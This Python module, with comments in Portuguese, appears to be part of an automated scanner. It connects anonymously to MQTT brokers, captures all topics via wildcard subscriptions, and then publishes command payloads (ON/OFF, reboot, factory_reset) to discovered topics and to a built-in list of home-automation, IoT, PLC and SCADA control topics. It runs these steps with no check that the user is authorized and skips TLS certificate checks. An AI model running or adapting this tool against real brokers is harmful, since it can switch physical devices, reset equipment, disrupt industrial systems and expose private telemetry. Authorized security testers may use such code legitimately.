"""
MQTTExplorer — reconhecimento e exploração autônoma de brokers MQTT.

Fases de execução:
  1. Conexão anônima com fallback multi-porta (1883, 9001, 1884, 8883-TLS)
  2. Subscrição wildcard (#, $SYS/#) para captura de tópicos e mensagens
  3. Análise dos dados capturados: identificar tópicos de controle e padrão de payload
  4. Injeção de payloads nos tópicos de controle descobertos + lista estática
  5. Scoring de severidade com base no impacto real confirmado
"""

import json
import logging
import queue
import threading
import time
from typing import Any, Dict, List, Optional

logger = logging.getLogger("cymag.mqtt")

try:
    import paho.mqtt.client as mqtt_client
    PAHO_AVAILABLE = True
except ImportError:
    PAHO_AVAILABLE = False
    logger.warning("[MQTT] paho-mqtt não instalado. Execute: pip install paho-mqtt")


# ─── BASE DE TÓPICOS DE CONTROLE (usada quando não há captura) ───────────────

CONTROL_TOPIC_PATTERNS = [
    # Genérico
    "cmd", "command", "control", "set", "trigger", "update", "action",
    # Atuadores
    "actuator/set", "actuator/command", "actuator/trigger",
    "actuators/set", "actuators/command",
    # Dispositivos
    "device/control", "device/cmd", "device/set",
    "devices/command", "devices/set",
    # Home automation
    "home/all/set", "home/switch/set", "home/light/set",
    "homeassistant/switch/cymag_test/set",
    "homeassistant/light/cymag_test/set",
    # Plataformas IoT conhecidas
    "zigbee2mqtt/0x0000000000000000/set",
    "shellies/shelly-test/relay/0/command",
    "tasmota/cmnd/POWER",
    "esp/test/cmd",
    "esp32/test/command",
    # Industrial / SCADA / OT
    "plc/output/set",
    "scada/control",
    "scada/cmd",
    "modbus/coil/set",
    "iec104/cmd",
    # IoT genérico
    "sensors/test/command",
    "nodes/test/set",
    "iot/test/control",
    "gateway/cmd",
]

# Payloads ordenados por probabilidade de sucesso
INJECT_PAYLOADS = [
    # Booleano simples (mais comum em IoT)
    "ON", "OFF", "on", "off", "1", "0", "true", "false",
    # JSON estado (Home Assistant / Zigbee2MQTT)
    '{"state": "ON"}',
    '{"state": "OFF"}',
    '{"value": 1}',
    '{"value": 0}',
    '{"brightness": 255}',
    '{"power": true}',
    '{"power": false}',
    # JSON comando
    '{"cmd": "status"}',
    '{"command": "info"}',
    '{"action": "get_status"}',
    # Controle crítico (reboot/reset)
    '{"cmd": "reboot"}',
    '{"action": "reset"}',
    '{"command": "restart"}',
    '{"cmd": "factory_reset"}',
]


class MQTTExplorer:
    """
    Explora um broker MQTT de forma completamente autônoma.

    Exemplo:
        result = MQTTExplorer("192.168.1.100", 1883).explore()
        print(result["exploit_evidence"])
    """

    def __init__(self, host: str, port: int = 1883, capture_secs: int = 7):
        self.host = host
        self.port = port
        self.capture_secs = capture_secs
        self._msg_queue: queue.Queue = queue.Queue()
        self._client: Optional[Any] = None
        self._connected = False

    # ─── PONTO DE ENTRADA PÚBLICO ─────────────────────────────────────────────

    def explore(self) -> Dict:
        result: Dict = {
            "anonymous_access": False,
            "connection_method": None,
            "broker_info": {},
            "topics_captured": [],
            "messages_sample": [],
            "topics_injectable": [],
            "payloads_sent": 0,
            "payloads_accepted": [],
            "exploit_evidence": [],
            "severity": "info",
            "cvss": 0.0,
            "description": "Sem acesso anônimo ao broker.",
        }

        if not PAHO_AVAILABLE:
            result["description"] = "paho-mqtt não instalado. Execute: pip install paho-mqtt"
            return result

        # ── 1. Tentativas de conexão (fallback multi-estratégia) ─────────────
        connection_matrix = [
            ("mqtt_plain_1883",     lambda: self._connect_plain(self.host, 1883)),
            ("mqtt_ws_9001",        lambda: self._connect_plain(self.host, 9001)),
            ("mqtt_plain_1884",     lambda: self._connect_plain(self.host, 1884)),
            ("mqtt_tls_8883_nocheck", lambda: self._connect_tls(self.host, 8883)),
        ]

        for name, attempt in connection_matrix:
            try:
                if attempt():
                    result["anonymous_access"] = True
                    result["connection_method"] = name
                    logger.info("[MQTT] ✓ Conexão anônima via %s em %s", name, self.host)
                    break
            except Exception as e:
                logger.debug("[MQTT] ✗ %s falhou: %s", name, e)

        if not result["anonymous_access"]:
            return result

        # ── 2. Captura de tópicos via wildcard ────────────────────────────────
        self._subscribe_and_capture()

        # ── 3. Processar mensagens capturadas ─────────────────────────────────
        messages: List[Dict] = []
        while not self._msg_queue.empty():
            try:
                messages.append(self._msg_queue.get_nowait())
            except queue.Empty:
                break

        result["messages_sample"] = messages[:30]
        result["topics_captured"] = sorted({m["topic"] for m in messages})
        result["broker_info"] = self._extract_sys_info(messages)

        # ── 4. Identificar tópicos injetáveis ─────────────────────────────────
        injectable = self._find_injectable_topics(messages)
        result["topics_injectable"] = injectable

        # ── 5. Injeção de payloads ────────────────────────────────────────────
        inject_result = self._inject_payloads(injectable)
        result["payloads_sent"] = inject_result["total_sent"]
        result["payloads_accepted"] = inject_result["accepted"]
        result["exploit_evidence"] = inject_result["evidence"]

        # ── 6. Scoring ───────────────────────────────────────────────────────
        result = self._score(result)

        # ── 7. Desconectar limpo ─────────────────────────────────────────────
        self._disconnect()
        return result

    # ─── CONEXÃO ─────────────────────────────────────────────────────────────

    def _connect_plain(self, host: str, port: int, timeout: int = 5) -> bool:
        uid = f"cymag_probe_{int(time.time())}"
        state = {"ok": False}
        c = mqtt_client.Client(
            mqtt_client.CallbackAPIVersion.VERSION2,
            client_id=uid,
        )
        c.on_connect = lambda cli, ud, flags, rc, props=None: state.update({"ok": rc == 0})
        try:
            c.connect(host, port, keepalive=10)
            c.loop_start()
            deadline = time.time() + timeout
            while time.time() < deadline:
                if state["ok"]:
                    self._client = c
                    self._connected = True
                    return True
                time.sleep(0.1)
        except Exception:
            pass
        try:
            c.loop_stop()
            c.disconnect()
        except Exception:
            pass
        return False

    def _connect_tls(self, host: str, port: int, timeout: int = 5) -> bool:
        """MQTT sobre TLS sem validação de certificado (para ambientes internos)."""
        import ssl
        uid = f"cymag_tls_{int(time.time())}"
        state = {"ok": False}
        c = mqtt_client.Client(
            mqtt_client.CallbackAPIVersion.VERSION2,
            client_id=uid,
        )
        c.tls_set(cert_reqs=ssl.CERT_NONE)
        c.tls_insecure_set(True)
        c.on_connect = lambda cli, ud, flags, rc, props=None: state.update({"ok": rc == 0})
        try:
            c.connect(host, port, keepalive=10)
            c.loop_start()
            deadline = time.time() + timeout
            while time.time() < deadline:
                if state["ok"]:
                    self._client = c
                    self._connected = True
                    return True
                time.sleep(0.1)
        except Exception:
            pass
        return False

    # ─── CAPTURA ─────────────────────────────────────────────────────────────

    def _subscribe_and_capture(self):
        if not self._client:
            return

        def on_message(client, userdata, msg):
            try:
                payload = msg.payload.decode("utf-8", errors="replace").strip()
                self._msg_queue.put({
                    "topic":   msg.topic,
                    "payload": payload,
                    "qos":     msg.qos,
                    "retain":  bool(msg.retain),
                })
            except Exception:
                pass

        self._client.on_message = on_message
        # Subscrever em TUDO — incluindo metadados internos do broker
        self._client.subscribe("#", qos=0)
        self._client.subscribe("$SYS/#", qos=0)

        logger.info("[MQTT] Capturando tópicos por %ds...", self.capture_secs)
        time.sleep(self.capture_secs)

    # ─── ANÁLISE ─────────────────────────────────────────────────────────────

    @staticmethod
    def _extract_sys_info(messages: List[Dict]) -> Dict:
        """Extrai informações do broker via tópicos $SYS."""
        info: Dict = {}
        for m in messages:
            topic = m["topic"]
            if topic.startswith("$SYS/"):
                key = topic.split("/")[-1]
                info[key] = m["payload"]
        return info

    @staticmethod
    def _find_injectable_topics(messages: List[Dict]) -> List[Dict]:
        """
        Heurística para identificar tópicos de CONTROLE nos dados capturados.
        Score baseado em palavras-chave no tópico e no formato/conteúdo do payload.
        """
        seen: set = set()
        candidates: List[Dict] = []

        for m in messages:
            topic   = m["topic"]
            payload = m["payload"]

            # Ignorar $SYS e tópicos já vistos
            if topic in seen or topic.startswith("$SYS"):
                continue

            score = 0
            p_lower = payload.lower()
            t_lower = topic.lower()

            # Palavras-chave no TÓPICO
            for kw in ["set", "cmd", "command", "control", "action", "trigger",
                       "actuator", "relay", "switch", "power", "light", "plug",
                       "output", "valve", "motor", "coil"]:
                if kw in t_lower:
                    score += 2

            # Palavras-chave no PAYLOAD
            for kw in ["on", "off", "true", "false", "state", "cmd",
                       "command", "action", "value", "power", "brightness"]:
                if kw in p_lower:
                    score += 1

            # JSON detectado
            if payload.startswith("{"):
                score += 1
                try:
                    parsed = json.loads(payload)
                    if any(k in parsed for k in ["state", "cmd", "command",
                                                  "action", "value", "power"]):
                        score += 3
                except Exception:
                    pass

            # Payload curto e simples (ON/OFF/1/0) é muito suspeito
            if payload.upper() in ("ON", "OFF", "1", "0", "TRUE", "FALSE"):
                score += 3

            if score >= 2:
                seen.add(topic)
                candidates.append({
                    "topic":        topic,
                    "last_payload": payload,
                    "score":        score,
                })

        # Retorna os top-10 mais promissores
        return sorted(candidates, key=lambda x: x["score"], reverse=True)[:10]

    # ─── INJEÇÃO ─────────────────────────────────────────────────────────────

    def _inject_payloads(self, injectable_topics: List[Dict]) -> Dict:
        """
        Injeta payloads nos tópicos descobertos + lista estática de controle.
        Retorna evidências de sucesso.
        """
        accepted: List[Dict] = []
        evidence: List[str] = []
        total_sent = 0

        if not self._client or not self._connected:
            return {"total_sent": 0, "accepted": accepted, "evidence": evidence}

        # Prioridade 1: tópicos descobertos na captura (mais relevantes)
        topics_priority = [t["topic"] for t in injectable_topics]

        # Prioridade 2: tópicos de controle estáticos
        for tp in CONTROL_TOPIC_PATTERNS:
            if tp not in topics_priority:
                topics_priority.append(tp)

        # Injetar (limitado para não ser excessivamente ruidoso)
        for topic in topics_priority[:25]:
            for payload in INJECT_PAYLOADS[:10]:
                try:
                    pub_result = self._client.publish(
                        topic, payload, qos=1, retain=False
                    )
                    pub_result.wait_for_publish(timeout=2.0)
                    total_sent += 1

                    if pub_result.rc == 0:
                        entry = {"topic": topic, "payload": payload}
                        accepted.append(entry)
                        evidence.append(
                            f"✓ PAYLOAD ACEITO → tópico: '{topic}' | payload: '{payload}'"
                        )
                        logger.warning(
                            "[MQTT EXPLOIT] Payload aceito em %s → %s : %s",
                            self.host, topic, payload
                        )
                        # Um aceito por tópico é suficiente como PoC
                        break

                    time.sleep(0.03)

                except Exception as e:
                    logger.debug("[MQTT inject] %s → %s: %s", topic, payload, e)

        return {"total_sent": total_sent, "accepted": accepted, "evidence": evidence}

    # ─── SCORING ─────────────────────────────────────────────────────────────

    @staticmethod
    def _score(result: Dict) -> Dict:
        n_accepted  = len(result["payloads_accepted"])
        n_topics    = len(result["topics_captured"])
        n_injectable = len(result["topics_injectable"])

        if n_accepted > 0:
            result["severity"] = "crit"
            result["cvss"]     = 9.8
            result["description"] = (
                f"BROKER MQTT SEM AUTH COM INJEÇÃO CONFIRMADA. "
                f"{n_accepted} payload(s) aceito(s) em tópicos de controle. "
                f"Tópicos capturados: {n_topics} | Injetáveis identificados: {n_injectable}. "
                f"Atacante pode enviar comandos arbitrários a dispositivos IoT/OT."
            )
        elif n_topics > 0:
            result["severity"] = "crit"
            result["cvss"]     = 9.3
            result["description"] = (
                f"Broker MQTT exposto SEM AUTENTICAÇÃO. "
                f"{n_topics} tópico(s) capturado(s) via wildcard. "
                f"Leitura irrestrita de dados IoT/OT/SCADA confirmada."
            )
        else:
            result["severity"] = "high"
            result["cvss"]     = 7.5
            result["description"] = (
                "Broker MQTT aceita conexão anônima. "
                "Nenhum dado capturado no período — tente aumentar capture_secs."
            )

        return result

    # ─── UTILITÁRIOS ─────────────────────────────────────────────────────────

    def _disconnect(self):
        if self._client:
            try:
                self._client.loop_stop()
                self._client.disconnect()
            except Exception:
                pass
            self._client = None
            self._connected = False
